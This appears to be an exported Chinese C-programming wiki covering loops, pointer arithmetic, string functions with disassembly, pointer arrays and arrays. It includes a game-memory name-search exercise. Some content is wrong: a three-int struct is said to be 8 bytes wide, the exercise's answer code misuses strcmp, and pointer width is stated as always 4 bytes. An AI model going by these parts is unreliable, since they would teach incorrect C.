OFFSET(st, field) (size_t)&amp;(((st*)0)-&gt;field)struct B&#123; char a; int b; double c;&#125;;struct A&#123; short c; struct B d; int e;&#125;;int main() &#123; printf(&quot;Size of struct B: %lu a-%lu, b-%lu, c-%lu &quot;, sizeof(struct B), OFFSET(struct B, a), OFFSET(struct B, b), OFFSET(struct B, c)); printf(&quot;Size of struct A: %lu c-%lu, d.a-%lu, d.b-%lu, d.c-%lu, e-%lu &quot;, sizeof(struct A), OFFSET(struct A, c), OFFSET(struct A, d.a), OFFSET(struct A, d.b), OFFSET(struct A, d.c), OFFSET(struct A, e)); return 0;&#125; 参考 链接 备注 C语言字节对齐问题详解 写得很详细 字节对齐与填充（Data Alignment and Padding In C） 写得太发散了 Lecture 5: Structures and Alignment University of Washington的课，写得也很好"},{"title":"循环语句","path":"/wiki/C/循环语句.html","content":"循环语句 循环语句 while 循环 12345678while(表达式) 语句; while(表达式)&#123; 语句; 语句;&#125; do...while 循环 12345do&#123; 语句;&#125;while(表达式); 特点：先执行一次，再判断表达式是否成立 for 循环 1234for(表达式1;表达式2;表达式3)&#123; 语句; // 需要执行的代码4&#125; 决定循环体是否执行看的是表达式2，所以表达式2需要有布尔值 执行逻辑：执行表达式1-&gt;判断表达式2是否成立 如果成立，执行语句-&gt;执行表达式3-&gt;判断表达式2是否成立-&gt;… 如果不成立，不执行语句-&gt;执行表达式3-&gt;判断表达式2是否成立-&gt;… 执行顺序：1-&gt;243→243→243…直至表达式2不成立，循环结束 证明for循环表达式的执行顺序1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt; void T1()&#123; printf(&quot;T1 &quot;);&#125;int T2()&#123; printf(&quot;T2 &quot;); return -1;&#125;void T3()&#123; printf(&quot;T3 &quot;);&#125;void T4()&#123; printf(&quot;T4 &quot;);&#125; void main()&#123; for(T1();T2();T3()) &#123; T4(); &#125; return;&#125; 表达式可以省略不写。表达式2不写，为真 123456789101112for(;;)&#123; printf(&quot;默认成立 &quot;);&#125;for(;-1;)&#123; printf(&quot;非0成立 &quot;);&#125;for(;0;)&#123; printf(&quot;0不成立 &quot;);&#125; 第1和第3个表达式可以使用逗号 1234567int i;int j;int z;for (i = 0, j = 0, z = 0; i &lt; 10; i++, j++, z++)&#123; printf(&quot;%d %d %d &quot;, i, j, z);&#125; break和continue break和continue都是循环控制语句，但它们的作用是不同的。break语句用于立即结束当前的整个循环结构，包括for、while和do-while循环，对if语句没用。它将控制权转移到循环块的下一条语句。 continue语句用于结束当前循环中的剩余部分，然后立即开始下一次循环。它不会结束整个循环，只是跳过当前循环的剩余部分。 break的例子 1234567891011#include &lt;stdio.h&gt;int main() &#123; for(int i = 0; i &lt; 10; i++) &#123; if(i == 5) &#123; break; &#125; printf(&quot;%d &quot;, i); &#125; return 0;&#125; 当i等于5时，break语句执行，整个for循环立即结束。所以，输出结果是：0 1 2 3 4。 continue的例子 1234567891011#include &lt;stdio.h&gt;int main() &#123; for(int i = 0; i &lt; 10; i++) &#123; if(i == 5) &#123; continue; &#125; printf(&quot;%d &quot;, i); &#125; return 0;&#125; 当i等于5时，continue语句执行，当前的循环会被跳过，然后立即开始下一次循环。所以，输出结果是：0 1 2 3 4 6 7 8 9。可以看到，当i等于5时，没有输出，因为continue语句跳过了打印语句。 总的来说，break用于完全结束循环，而continue用于跳过当前循环的剩余部分，然后开始下一次循环。 反汇编 do循环 goto语句可以模拟do循环结构 例：用goto语句打印0-N的值。 下述代码其实就是汇编正向开发中写循环的方法 1234567891011121314151617#include &lt;stdio.h&gt; void MyPrint(int x)&#123; int i = 0;B: printf(&quot;%d &quot;,i); i++; if(i&lt;=x) goto B;&#125;int main()&#123; MyPrint(10); return 0;&#125; goto就是汇编中的jmp do while 1234DO_BEGIN: ...... ;循环语句块 ;影响标记位的指令 jxx DO_BEGIN ;向上跳转 用的jxx和源码逻辑相同，这与if不同，if的是相反的 while 123456WHILE_BEGIN: ;影响标志位的指令 jxx WHILE_END ;条件成立跳转到循环语句块结尾处 ...... jmp WHILE_BEGIN ;跳转到条件比较处 WHILE_END: for"},{"title":"指针特征探测","path":"/wiki/C/指针特征探测.html","content":"引 如果你之前学过指针，当我一提起指针时可能你马上会想到地址。请忘掉这一点，在这一小节课中，我们只需要知道指针是一种新的数据类型，就好了。接下来我们将对这个新的数据类型的特征进行一一探测。 定义 指针就是一种新的类型，与char、int、数组、结构体一样，都是类型。 给任何数据类型加上*以后，就是“指针类型”。 *可以是任意多个。 内置类型/自定义类型的声明1234567char x;short y;int z;float f;double d;Student st; 指针类型的声明1234567char* x;short* y;int* z;float* f;double* d;Student* st; 为了可读性，建议写成char* x而不是char *x 赋值 我们平时给变量赋值时其实写的是简写形式，编译器是智能的，它能看明白。而完整的写法如下： 1234int x;x = 1; // 简写形式x = (int)1; // 完整写法 同理，给指针变量赋值的完整写法如下: 带*类型的变量赋值时只能用完整写法。 其实是强转了，如果是如下代码，类型不匹配 123int* z;z = 3; 宽度 谈起数据类型，我们要关注它的宽度。 指针类型变量的宽度永远是4字节，无论是什么类型的指针，无论*号有几个。 一级指针多级指针1234567891011121314#include &quot;stdafx.h&quot;int main()&#123; char* x; short* y; int* z; x = (char*)1; y = (short*)2; z = (int*)3; return 0;&#125; VC++编译器默认给函数默认缓冲区为40h，上面代码声明了3个指针类型。多了Ch的空间（4Ch-40g=Ch）。 分空间看不出宽度，要看使用时是byte、word还是dword。可以看到，赋值时是dword。 所以指针类型宽度为4个字节 1234567891011121314#include &quot;stdafx.h&quot;int main()&#123; char****** x; short****** y; int****** z; x = (char******)1; y = (short******)2; z = (int******)3; return 0;&#125; 自加/自减 这里以自加为例，自减一样的 基本数据类型自加一级指针自加二级指针自加1234567891011121314151617181920#include &quot;stdafx.h&quot;int main()&#123; char a; short b; int c; a = 100; b = 100; c = 100; a++; b++; c++; printf(&quot;%d %d %d&quot;, a, b, c); return 0;&#125; 1234567891011121314151617181920#include &quot;stdafx.h&quot;int main()&#123; char* a; short* b; int* c; a = (char*)100; b = (short*)100; c = (int*)100; a++; b++; c++; printf(&quot;%d %d %d&quot;, a, b, c); return 0;&#125; 这里用的是二级指针的例子，如果是多级指针也一样。 1234567891011121314151617181920#include &quot;stdafx.h&quot;int main()&#123; char** a; short** b; int** c; a = (char**)100; b = (short**)100; c = (int**)100; a++; b++; c++; printf(&quot;%d %d %d&quot;, a, b, c); return 0;&#125; 小结 不带*类型的变量，++或者–，就是加1或者减1 带*类型的变量，可进行++或者–的操作 带*类型的变量++或者–新增(减少)的数量是去掉一个*后变量的宽度 不带*类型的变量 ++ – char 1 1 short 1 1 int 1 1 带1个*类型的变量 ++ – char* 1 1 short* 2 2 int* 4 4 带多个*类型的变量 ++ – char* 4 4 short** 4 4 int** 4 4 加减法运算 这里以加法为例，减法一样的 一级指针做加法二级指针做加法1234567891011121314151617181920#include &quot;stdafx.h&quot;int main()&#123;\tchar* a ; short* b ; int* c ; a = (char*)100; b = (short*)100; c = (int*)100; a = a + 5; b = b + 5; c = c + 5; printf(&quot;%d %d %d&quot;,a,b,c); return 0;&#125; 编译器看到a+5，将a的类型char*去掉1个*，是char，它的宽度是1，所以+5*1 编译器看到b+5，将b的类型short*去掉1个*，是short，它的宽度是2，所以+5*2 编译器看到c+5，将c的类型int*去掉1个*，是int，它的宽度是4，所以+5*4 1234567891011121314151617181920#include &quot;stdafx.h&quot;int main()&#123;\tchar** a ; short** b ; int** c ; a = (char**)100; b = (short**)100; c = (int**)100; a = a + 5; b = b + 5; c = c + 5; printf(&quot;%d %d %d&quot;,a,b,c); return 0;&#125; 编译器看到a+5，将a的类型char**去掉1个*，是char*，它的宽度是4，所以+5*4 编译器看到b+5，将b的类型short**去掉1个*，是short*，它的宽度是4，所以+5*4 编译器看到c+5，将c的类型int**去掉1个*，是int*，它的宽度是4，所以+5*4 +5，可以看成5次++运算 小结 带*类型的变量可以加、减一个整数，但不能乘或者除一个数（会编译不通过） 带*类型变量与其他整数相加或者相减时： 带*类型变量 + N = 带*类型变量 + N*(去掉一个*后类型的宽度) 带*类型变量 - N = 带*类型变量 - N*(去掉一个*后类型的宽度) 求差值 指针类型可以做差值运算，乘除虽然可以，但是运算的结果没意义。 两个指针类型变量做差值运算，它们*的数量要一样才能相减，要不编译不通过。 一级指针char*相减一级指针short*相减一级指针int*相减多级指针相减结构体指针相减12345678910111213141516#include &quot;stdafx.h&quot;int main()&#123;\tchar* a ; char* b ; a = (char*)200; b = (char*)100; int x = a - b; printf(&quot;%d &quot;,x); return 0;&#125; 将a的类型char*去掉1个*，是char，它的宽度是1 将b的类型char*去掉1个*，是char，它的宽度是1 (200-100)/1=100 12345678910111213141516#include &quot;stdafx.h&quot;int main()&#123;\tshort* a ; short* b ; a = (short*)200; b = (short*)100; int x = a - b; //注意：两个指针类型相减后是整型int类型。如果有小数，会舍去。比如(20-10)/4=2 printf(&quot;%d &quot;,x); return 0;&#125; 将a的类型short*去掉1个*，是short，它的宽度是2 将b的类型short*去掉1个*，是short，它的宽度是2 (200-100)/2=50 12345678910111213141516#include &quot;stdafx.h&quot;int main()&#123;\tint* a ; int* b ; a = (int*)200; b = (int*)100; int x = a - b; printf(&quot;%d &quot;,x); return 0;&#125; 将a的类型int*去掉1个*，是int，它的宽度是4 将b的类型int*去掉1个*，是int，它的宽度是4 (200-100)/4=25 12345678910111213141516#include &quot;stdafx.h&quot;int main()&#123;\tchar**** a ; char**** b ; a = (char****)200; b = (char****)100; int x = a - b; printf(&quot;%d &quot;,x); return 0;&#125; 将a的类型char****去掉1个*，是char***，它的宽度是4 将b的类型char****去掉1个*，是char***，它的宽度是4 (200-100)/4=25 1234567891011121314151617181920212223#include &quot;stdafx.h&quot;struct Point&#123; int x; int y; int z;&#125;;int main()&#123;\tstruct Point* a ; struct Point* b ; a = (struct Point*)100; b = (struct Point*)20; int x = a - b; printf(&quot;%d &quot;,x); return 0;&#125; 将a的类型struct Point*去掉1个*，是struct Point，它的宽度是8 将b的类型struct Point*去掉1个*，是struct Point，它的宽度是8 (100-20)/8，运算结果是int类型，舍去小数，所以是6 小结 两个类型相同的带*类型的变量可以进行减法操作 相减的结果要除以去掉一个*的数据的宽度 比较 带*的变量，如果类型相同，可以做大小的比较。 就是一种新的数据类型，一个放了200，一个存了100。200比100大，这里不要想到什么地址，这一小节课不提地址。 123456789101112131415161718192021#include &quot;stdafx.h&quot;int main()&#123;\tchar**** a ; char**** b ; a = (char****)200; b = (char****)100; if(a&gt;b) &#123; printf(&quot;1&quot;); &#125; else &#123; printf(&quot;2&quot;); &#125; return 0;&#125; 看汇编，编译器用的是jbe，说明指针是无符号数"},{"title":"指针与字符串","path":"/wiki/C/指针与字符串.html","content":"字符串的三种表现形式 %s：打印一个字符串，遇’/0’或0停止 形式一：char str[6] = &#123;'A', 'B', 'C', 'D', 'E'&#125;; 形式二：char str[] = &quot;ABCDE&quot;; 形式三：char *str = &quot;ABCDE&quot;; 字符数组字符串字符串指针1char str[6] = &#123;&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;&#125;; 这条语句定义了一个字符数组，数组的大小是6个字符。它显式地包含了6个字符，没有包含空字符(‘\\0’)，这意味着它不是一个标准的以空字符结尾的字符串。如果尝试使用像printf(“%s”, str);这样的字符串函数来打印它，可能会导致未定义行为，因为函数会继续读取内存直到遇到空字符。 对每个字符查ASCII表，将查表后得到的数值存到定义的局部变量中1char str[] = &quot;ABCDE&quot;; 这条语句定义了一个字符数组，并自动计算数组的大小为6个字符（包括最后的空字符’\\0’）。这是一个以空字符结尾的字符串，可以安全地用在所有期望字符串的标准C函数中。 编译器先在常量区找一块空间，存&quot;ABCDE&quot;这个字符串，然后将字符串复制到数组中（看汇编代码，通过eax移动4个字节，然后cx移字符E和结束符0这两个字节）。复制到数组后我们就可以进行读写。 如 12char str[] = &quot;ABCDE&quot;;str[0] = &#x27;K&#x27;; 先在常量区找一块空间存这个字符串的好处是，当以后还用到这个字符串时，就不用再分配空间，常量区中已经有了。1char *str = &quot;ABCDE&quot;; //常量区，只能读不能写 这条语句定义了一个指向字符的指针，并将它初始化为指向字符串常量&quot;ABCDE&quot;的地址。字符串常量通常存储在程序的只读数据段，这意味着你不应该尝试修改字符串的内容，如str[0] = ‘X’;这样的操作编译虽然可以通过，但执行报0xC0000005的错误。和第二条语句一样，这个字符串也是以空字符结尾。 汇编指令，可以看到取该字符串起始地址给指针变量 用&quot;ABCDE&quot;这种形式的字符串，编译器会自动在末尾填0做为字符串的结束标记。写字符数组也可以自己手动添零，如下两种是一样的： 12345char arr[6] = &#123;&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;\\0&#x27;&#125;; // 也可以直接写 0char names[] = &quot;ABCDE&quot;;printf(&quot;%s &quot;, arr);printf(&quot;%s &quot;, names); 字符串能否修改的问题 内存分布图 123456789 ---------------| 代码区 | 代码 ---------------| 栈 | 参数，局部变量 ---------------| 全局变量 | 全局变量 可读，可写 ---------------| 常量区 | 常量区 可读，不可写 --------------- 例1 x存的是常量区中“china”字符串的首地址，常量区不可写，不能通过指针来修改它。 y字符数组是将常量区的“china”拷贝一份到栈中（局部变量），在栈中可读可写 123456789char* x = &quot;china&quot;;char y[] = &quot;china&quot;;void Function()&#123; *(x + 1) = &#x27;A&#x27;; //编译能通过，执行报错0xC0000005 y[1] = &#x27;A&#x27;; //编译能通过，也能执行&#125; 例2 12345678void Function()&#123; char *x = &quot;china&quot;; // 还是在常量区 char y[] = &quot;china&quot;; *(x + 1) = &#x27;A&#x27;; // 编译能通过，执行报错0xC0000005 y[1] = &#x27;A&#x27;; // 编译能通过，也能执行&#125; 常用的字符串函数 头文件#include &lt;string.h&gt; 1234int strlen(char *s); // 返回类型是字符串s的长度，不包含结束符号\\0char* strcpy(char *dest, char *src); // 复制字符串src到dest中，返回指针为dest的值char* strcat(char *dest, char *src); // 将字符串src添加到dest尾部，返回指针为dest的值int strcmp(char *s1, char *s2); // 比较s1和s2，一样则返回0，不一样返回非0 下面来自己实现以上的函数 参考：面试题之strcpy/strlen/strcat/strcmp的实现 如何实现一个满分的strcpy函数？ To do：断言 strlen函数 参考：https://zhuanlan.zhihu.com/p/435423218 常规做法指针相减在C语言中，后缀递增（++）的优先级高于解引用（*），但是后缀递增是一个“副作用”操作，其增加指针的值的效果会在表达式的值被使用后发生。 *str++先对指针s解引用取它指向的值，然后指针s++，指向下一个元素；*++str先指针++，指向下一个元素，然后指针s解引用取它指向的值。 123456789size_t my_strlen(const char* str)&#123; int count = 0; while (*str++) &#123; count++; &#125; return count;&#125;1234567891011size_t my_strlen(const char* str)&#123; const char* start = str; // 字符串起始位置 const char* end = str; while (*end != &#x27;\\0&#x27;) &#123; end++; &#125; //当*end=&#x27;\\0&#x27;时，退出while循环 //此时end指向结束标志的前一个字符 return end - start; //相减，得到长度&#125; 123456 A B C D E \\0while循环前： start end结束循环： start end 精简一下代码，变为 12345678size_t my_strlen(const char* str)&#123; const char* end = str; while (*end++); //当*end=&#x27;\\0&#x27;时，退出while循环 //此时end指向结束标志 return end-str-1; //相减，再减1，得到长度&#125; *end++，end指向的字符如果不是0，end++，当*end='\\0’时，while循环结束，此时end指向结束标志。最后相减时要多减1 123456 A B C D E \\0while循环前： start end结束循环： start end src文件夹中的 strlen.c ：（和上面的代码原理一样，只是变量名不同） 12345678910size_t __cdecl strlen ( const char * str )&#123; const char *eos = str; while( *eos++ ) ; return( eos - str - 1 );&#125; strcpy函数 前提：des和src所指内存区域不可以重叠且des必须有足够的空间来容纳src的字符串 测试函数 12345678910#include &quot;stdafx.h&quot;int main()&#123; char x[] = &quot;china&quot;; char y[] = &quot;XYZ&quot;; strcpy(x, y); printf(&quot;%s&quot;, x); return 0;&#125; 1234567891011121314char* strcpy(char* des, const char* src)&#123; char* ret = des; // 存目的串的首地址 while (*src!=&#x27;\\0&#x27;) &#123; *des=*src; src++; des++; &#125; *des=&#x27;\\0&#x27;; return ret;&#125; 1234567891011121314151617while循环前： c h i n a \\0 des src X Y Z \\0 结束循环： X Y Z n a \\0 des src X Y Z \\0给des加\\0： X Y Z \\0 a \\0 des src X Y Z \\0 简洁点 123456789char* strcpy(char* des, const char* src)&#123; char* ret = des; // 存目的串的首地址 while (*des++ =* src++) ; return ret;&#125; 执行顺序有点混乱的话，可以看汇编来知道 while循环，先看表达式是否成立，因为这个表达式是个赋值表达式，赋值表达式的结果是分配给左操作数的值，所以先执行赋值表达式，得到表达式的结果，才能判断while循环要执行还是不执行。 1234567while循环： *des=*str 赋值表达式的结果是*des 随后，str++，des++ 赋值表达式的结果是0吗 如果是，结束while循环 如果不是，继续while循环 1234567891011121314151617181920212223242526272815: char* ret = des; // 存目的串的首地址00401038 mov eax,dword ptr [ebp+8]0040103B mov dword ptr [ebp-4],eax //局部变量ret=[ebp+8]：des串的地址16:17: while (*des++ =* src++)0040103E mov ecx,dword ptr [ebp+8] //ecx=[ebp+8]：des串的地址00401041 mov edx,dword ptr [ebp+0Ch] //edx=[ebp+0Ch]：src串的地址00401044 mov al,byte ptr [edx]00401046 mov byte ptr [ecx],al //*des=*src00401048 mov ecx,dword ptr [ebp+8]0040104B movsx edx,byte ptr [ecx] //取*des，并带符号拓展0040104E mov eax,dword ptr [ebp+8] //des++00401051 add eax,100401054 mov dword ptr [ebp+8],eax00401057 mov ecx,dword ptr [ebp+0Ch] //src++0040105A add ecx,10040105D mov dword ptr [ebp+0Ch],ecx00401060 test edx,edx //edx是*des,判断while表达式是否为000401062 je strcpy+46h (00401066) //为0，结束while循环 18: ;00401064 jmp strcpy+1Eh (0040103e) //否则，继续while循环19:20: return ret;00401066 mov eax,dword ptr [ebp-4] strcat函数 前提：des 和 src 所指内存区域不可以重叠且 des 必须有足够的空间来容纳 src 的字符串 12345678910111213 while (*des++) //这个写法有问题 ; 取des的值，然后des++，*des是否=0？ 等于0，结束while循环 不等于0，继续des指向a，*des=a，然后des++，*des是否=0？不等于0，继续des指向0，*des=&#x27;\\0&#x27;，然后des++，*des是否=0？等于0，退出此时des指向了&#x27;\\0&#x27;下一个字符c h i n a 0 ? des 1234567891011121314char* strcat(char* des, const char* src)&#123; char* ret = des; // 存目的串的首地址 while (*des) //让des指向&#x27;\\0&#x27; &#123; des++; &#125;; // 拷贝src到des，就是strcpy的内容 while (*des++ =*src++) ; return ret;&#125; strcmp函数 若s1==s2，返回零； 若s1&gt;s2，返回正数； 若s1&lt;s2，返回负数。 123456789101112int strcmp(const char *s1,const char *s2)&#123; while(*s1 == *s2) //相等时才进入while循环 &#123; if(*s1 == &#x27;\\0&#x27;) //相等时进的while，某一个串此时的字符是\\0，则两个串相等，返回0 return 0; s1++; s2++; &#125; return *s1 - *s2;&#125; 123456789s1&lt;s2：s1：a b c \\0s2: a b c d \\0*s1=c,*s2=c，相等，进while，s1和s2都++。此时*s1=&#x27;\\0&#x27;，*s2=d，不相等，退出while。执行return *s1 - *s2;s1=s2：s1：a b c \\0s2: a b c \\0*s1=c,*s2=c，相等，进while，s1和s2都++。此时*s1=&#x27;\\0&#x27;，*s2=&#x27;\\0&#x27;，相等，进while。if语句成立，return 0 库函数源码分析 1234567891011121314151617int __cdecl strcmp ( const char * src, const char * dst )&#123; int ret = 0 ; while( ! (ret = *(unsigned char *)src - *(unsigned char *)dst) &amp;&amp; *dst) ++src, ++dst; if ( ret &lt; 0 ) ret = -1 ; else if ( ret &gt; 0 ) ret = 1 ; return( ret );&#125; 代码分析： 1int ret = 0 ; //字符串比较结果，默认两串相等，返回0 在我上面的写法，是逐个字符对比是否相等，找到不相等的位置，再相减结束函数。但实际上，可以直接让它们相减，相减的结果就是两个字符比较的结果，知道它们相等或不相等。 如果相减的结果为0，两个字符就是相同的。 如果相减的结果不为0，两个字符就是不相同的。 另外，再加上某个串是否到结尾的判断。 如果两字符相同，且没到结尾，则两指针++，继续比较下一个字符。 1234 *s1=*s2等价于 *s1-*s2==0 ret=*s1-*s2 //用一个变量来存相减的结果 上面的思路也就是库源码中的写法 12while( ! (ret = *(unsigned char *)src - *(unsigned char *)dst) &amp;&amp; *dst) ++src, ++dst; 这是一个while循环，它会一直执行，直到字符串不相等或者到达字符串dst的结尾（即*dst为’\\0’，字符串的结束标志）。让我们逐步分析这一长串的代码： 计算ret的值，ret的值为两个字符的差值。具体做法：为什么要转成unsigned char *个人理解：这份源码时微软实现的，它要考虑全球不同语言习惯的使用场景。而我一般都是从键盘上输入一些字符来测，都在ASCII表的[0-127]，很难用到[128,255]拓展ASCII表的字符。但如果是其他国家不同语言的人，他们可能用会到[128,255]的字符。按我们之前的想法，两字符相比，ASCII值较大的字符大。由于char类型是有符号数字，‘128’表示的字符取出来却是负数，比字符’A’(ASCII值是65)小，这就不对了，应该是128&gt;65才对。所以要以(unsigned char *)的方式取出，改变数据的解释方式，都解释为无符号数。确保strcmp函数的行为与我们以字符十进制大小作为比较依据的标准一致。 对src和dst强转，用unsigned char的方式来分别取出src和dst指针指向的字符，然后相减， 计算!ret的值，这将是一个布尔值，真或假。 表达式 1!ret &amp;&amp; *dst 如果!ret为真（即ret为0，两个字符相等），并且*dst不是字符串的结尾，那么src和dst指针都会向前移动一个字符（++src, ++dst），继续比较下一对字符。 如果!ret为真（即ret为0，两个字符相等），但是*dst是字符串的结尾，while条件为假，退出循环。 如果!ret为假（即ret不为0，两个字符不相等），表达式短路，不检查*dst，while条件为假，退出循环。 当循环结束时，如果ret为0，说明两个字符串完全相同。 当循环结束时，如果ret不为0，说明两个字符串在某个位置上不相等。此时， 如果ret小于0，说明src指向的字符在字典序上小于dst指向的字符，函数将返回-1； 如果ret大于0，说明src指向的字符在字典序上大于dst指向的字符，函数将返回1。 1234if ( ret &lt; 0 ) ret = -1 ;else if ( ret &gt; 0 ) ret = 1 ; 1return( ret ); 指针函数 指针是一种类型。 指针函数：是一个函数，返回类型为指针 如： 12char* strcpy(char* dest, char* src);char* strcat(char* dest, char* src); 模拟CE搜索字符串的功能 这一堆数据中存储了角色的名字信息(WOW)（0x57,0x4F,0x57），编写函数，返回角色名字信息的地址，如果则没有返回0 1char* FindRoleNameAddr(char* pData,char* pRoleName) 123456789100x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09, 0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00, 0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11, 0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00, 0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00, 0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00, 0x00,0x02,0x57,0x4F,0x57,0x00,0x06,0x08,0x00,0x00, 0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00 答案1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &quot;stdafx.h&quot;#include &lt;string.h&gt;char* FindRoleNameAddr(char* pData, char* pRoleName) &#123; if (pData == NULL || pRoleName == NULL) &#123; return 0; &#125; // 计算角色名字的长度 size_t roleNameLength = strlen(pRoleName); // 如果角色名字长度为0，直接返回0 if (roleNameLength == 0) &#123; return 0; &#125; // 遍历数据块，寻找匹配的角色名字 char* p = pData; for(int i=0;i&lt;=100-roleNameLength;i++) &#123; if (strcmp(pData,pRoleName)) &#123; // 找到匹配的角色名字，返回其地址 return p; &#125; ++p; &#125; // 没有找到匹配的角色名字，返回0 return 0;&#125;int main() &#123; // 示例数据 char data[] = &#123; 0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09, 0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00, 0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11, 0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00, 0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00, 0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00, 0x00,0x02,0x57,0x4F,0x57,0x00,0x06,0x08,0x00,0x00, 0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00, 0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00 &#125;; // 角色名字&quot;WOW&quot; char roleName[] = &quot;WOW&quot;; // 查找角色名字 char* roleNameAddr = FindRoleNameAddr(data, roleName); if (roleNameAddr != 0) &#123; printf(&quot;找到角色名字的地址: %p &quot;, (void*)roleNameAddr); &#125; else &#123; printf(&quot;没有找到角色名字 &quot;); &#125; return 0;&#125;"},{"title":"指针数组","path":"/wiki/C/指针数组.html","content":"指针数组 数组：在内存中连续存储一组相同数据类型的变量。 指针也是一种数据类型，那么，成员是指针数据类型的数组就是指针数组 指针数组：数组，成员是指针数据类型 声明 12345char arr[10]; //数组，有10个成员，每个成员是char类型，每个成员的宽度为1char* arr[10]; //数组，有10个成员，每个成员是char*类型，每个成员的宽度为4Point* arr[10]; //数组，有10个成员，每个成员是Point*类型，每个成员的宽度为sizeof(Point)int******** arr[10]; //数组，有10个成员，每个成员是int********类型，每个成员的宽度为4 赋值 char*数组例子int*数组例子12345// 方式一char* a = &quot;Hello&quot;;char* b = &quot;World&quot;;char* arr[2] = &#123;a, b&#125;; 1234567// 方式二char* a = &quot;Hello&quot;;char* b = &quot;World&quot;;char* arr1[2];arr1[0] = a;arr1[1] = b; 1234// 方式三char* arr2[2] = &#123;&quot;Hello&quot;, &quot;World&quot;&#125;; //第一个成员存&quot;Hello&quot;的地址 //第二个成员存&quot;World&quot;的地址 //&quot;Hello&quot;和&quot;World&quot;在常量区中12345// 方式一int a = 10;int b = 20;int* arr[2] = &#123;&amp;a, &amp;b&#125;; 1234567// 方式二int a = 10;int b = 20;int* arr[2];arr1[0] = &amp;a;arr1[1] = &amp;b; 12// 方式三int* arr[2] = &#123;(int*)10, (int*)20&#125;; // 无法int转到int*，强转一下 反汇编 1234567int a = 10;int b = 20;int c = 30;int d = 40;int e = 50;int* arr[5] = &#123;&amp;a, &amp;b, &amp;c, &amp;d, &amp;e&#125;; 练习 建一个字符指针数组，存储所有的C的关键词(查资料找)，并全部打印出来. 答案打印一个字符指针的会写把：1234567891011#include &quot;stdafx.h&quot;int main()&#123; char* a = &quot;Hello&quot;; printf(&quot;%s &quot;,a); return 0;&#125;现在变成打印指针数组中的每个成员：123456789101112131415161718192021222324#include &lt;stdio.h&gt;int main() &#123; // C语言的关键词 const char *keywords[] = &#123; &quot;auto&quot;, &quot;break&quot;, &quot;case&quot;, &quot;char&quot;, &quot;const&quot;, &quot;continue&quot;, &quot;default&quot;, &quot;do&quot;, &quot;double&quot;, &quot;else&quot;, &quot;enum&quot;, &quot;extern&quot;, &quot;float&quot;, &quot;for&quot;, &quot;goto&quot;, &quot;if&quot;, &quot;inline&quot;, &quot;int&quot;, &quot;long&quot;, &quot;register&quot;, &quot;restrict&quot;, &quot;return&quot;, &quot;short&quot;, &quot;signed&quot;, &quot;sizeof&quot;, &quot;static&quot;, &quot;struct&quot;, &quot;switch&quot;, &quot;typedef&quot;, &quot;union&quot;, &quot;unsigned&quot;, &quot;void&quot;, &quot;volatile&quot;, &quot;while&quot;, &quot;_Alignas&quot;, &quot;_Alignof&quot;, &quot;_Atomic&quot;, &quot;_Bool&quot;, &quot;_Complex&quot;, &quot;_Generic&quot;, &quot;_Imaginary&quot;, &quot;_Noreturn&quot;, &quot;_Static_assert&quot;, &quot;_Thread_local&quot; &#125;; int num_keywords = sizeof(keywords) / sizeof(char*); printf(&quot;C language keywords: &quot;); for (int i = 0; i &lt; num_keywords; i++) &#123; printf(&quot;%s &quot;, keywords[i]); &#125; return 0;&#125; 结构体指针数组 12345678struct Point&#123; int x; int y;&#125;;Point p; //宽度8字节Point arr[10]; //每个成员宽度为8，共8*10字节Point *arrPoint[10]; //每个成员宽度为4，共4*10字节"},{"title":"数组","path":"/wiki/C/数组.html","content":"定义 数组的本质：一组相同类型的变量，为了方便读写，采用的一种表示形式。 数组定义的语法格式如下： 1数据类型 变量名[整型常量表达式]; 为什么不能是变量？VC++debug版下编译器默认为一个函数分配的缓冲区大小是40h，每在函数里多声明一个变量，就会再40h的基础上加上声明的这个变量大小。如果声明数组时[]里用的是变量，变量的话没法确定，编译时就会出错。因为编译时需要转成汇编，在汇编代码中需要知道分配多大的缓冲区空间（sub esp xxh），否则没法确定汇编代码，就更不要谈后续生成exe了。1234567#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int age[10]; return 0;&#125;C99标准支持变长数组（variable-length array，VLA），C11放弃了这一特性，把VLA设定为可选。 内存分配 成员地址高低 普通变量的内存布局数组的内存布局按声明的顺序，从高地址到低地址（[ebp-4]-&gt;[ebp-8]-&gt;…） 1234567891011121314151617#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int v_1=1; int v_2=2; int v_3=3; int v_4=4; int v_5=5; int v_6=6; int v_7=7; int v_8=8; int v_9=9; int v_10=10; return 0;&#125; 第1个成员地址最低，其余成员地址从低到高依次分配。 其实这样排也能理解，因为数组使用，都从下标小的开始使用。 age[0]对应的是[ebp-28h]，age[1]对应的是[ebp-24h]… age[0]-&gt;age[1]-&gt;age[2]-&gt;…这样，也是从低地址到高地址 1234567#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int 